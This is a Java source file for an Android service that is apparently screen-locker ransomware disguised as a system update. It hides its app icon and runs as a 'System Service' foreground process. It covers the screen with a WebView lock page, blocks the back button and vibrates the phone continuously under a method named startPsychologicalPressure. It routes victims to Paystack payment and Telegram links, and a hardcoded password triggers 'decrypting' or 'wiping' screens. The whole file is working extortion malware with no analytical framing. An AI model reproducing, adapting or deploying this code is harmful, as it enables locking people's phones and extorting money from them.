package com.system.updatex;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.WindowManager;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class OverlayService extends Service {
    private static final String CHANNEL_ID = "fr4nx_kiosk";
    private static final int NOTIFICATION_ID = 9001;

    private WindowManager windowManager;
    private WindowManager.LayoutParams windowParams;
    private WebView lockWebView;
    private boolean overlayAttached = false;
    private Vibrator vibrator;

    @Override
    public void onCreate() {
        super.onCreate();
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        IconUtils.hideIcon(this);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NotificationManager.class)).createNotificationChannel(channel);
            startForeground(NOTIFICATION_ID, new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("System Service")
                    .setSmallIcon(android.R.drawable.ic_lock_lock)
                    .build());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!Settings.canDrawOverlays(this)) {
            stopSelf();
            return START_NOT_STICKY;
        }
        
        boolean isUnlocked = getSharedPreferences("fr4nx_state", MODE_PRIVATE).getBoolean("is_unlocked", false);
        if (isUnlocked) {
            stopSelf();
            return START_NOT_STICKY;
        }

        if (!overlayAttached) {
            createOverlay();
            startPsychologicalPressure();
        }
        return START_STICKY;
    }

    private void createOverlay() {
        if (overlayAttached) return;
        
        windowParams = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | 
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                WindowManager.LayoutParams.FLAG_SECURE, 
                PixelFormat.TRANSLUCENT
        );
        windowParams.gravity = Gravity.TOP | Gravity.START;
        windowParams.softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE;

        lockWebView = new WebView(this);
        WebSettings webSettings = lockWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setAllowFileAccessFromFileURLs(true);
        
        lockWebView.setBackgroundColor(0xFF050000);
        
        lockWebView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                // 1. AUTO-CLOSE ON SUCCESS: If Paystack redirects to our success URL, snap back to lock screen
                if (url.contains("fr4nx.wisp.uno") && (url.contains("paystack-webhook") || url.contains("reference=") || url.contains("trxref="))) {
                    lockWebView.loadUrl("file:///android_asset/lock_screen.html");
                    return true;
                }
                
                // 2. FIX BLACK SCREEN: If they click Telegram (tg://) or bank apps (intent://), open the app externally
                if (!url.startsWith("http://") && !url.startsWith("https://")) {
                    try {
                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(intent);
                    } catch (Exception e) {
                        // Ignore if the app isn't installed
                    }
                    return true; // Stop WebView from crashing
                }
                
                // 3. Let normal web pages load inside the app
                return false; 
            }
        });
        
        // 4. FIX BACK BUTTON: If they press the phone's back button on the Paystack page, snap back to the lock screen
        lockWebView.setOnKeyListener((v, keyCode, event) -> {
            if (event.getAction() == KeyEvent.ACTION_DOWN && keyCode == KeyEvent.KEYCODE_BACK) {
                if (lockWebView.canGoBack()) {
                    lockWebView.loadUrl("file:///android_asset/lock_screen.html");
                }
                return true;
            }
            return false;
        });
        
        lockWebView.addJavascriptInterface(new LockWebInterface(this), "Android");
        lockWebView.loadUrl("file:///android_asset/lock_screen.html");

        try {
            windowManager.addView(lockWebView, windowParams);
            overlayAttached = true;
        } catch (Exception e) {
            stopSelf();
        }
    }

    private void startPsychologicalPressure() {
        vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (vibrator != null && vibrator.hasVibrator()) {
            long[] pattern = {0, 1000, 1000};
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0));
            } else {
                vibrator.vibrate(pattern, 0);
            }
        }
    }

    public void authenticateUser(String pass) {
        if ("FR4NX.COM123".equals(pass)) { 
            lockWebView.post(() -> lockWebView.evaluateJavascript("showDecrypting();", null));
        } else {
            lockWebView.post(() -> lockWebView.evaluateJavascript("showWiping();", null));
        }
    }

    public void unlockOverlay() {
        if (vibrator != null) vibrator.cancel();
        getSharedPreferences("fr4nx_state", MODE_PRIVATE).edit().putBoolean("is_unlocked", true).commit();

        if (overlayAttached && lockWebView != null) {
            try {
                windowManager.removeView(lockWebView);
                lockWebView.destroy();
            } catch (Exception ignored) {}
            overlayAttached = false;
        }
        stopForeground(true);
        stopSelf();
    }

    @Override
    public void onDestroy() {
        if (vibrator != null) vibrator.cancel();
        if (overlayAttached && lockWebView != null) {
            try { windowManager.removeView(lockWebView); } catch (Exception ignored) {}
        }
        stopForeground(true);
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
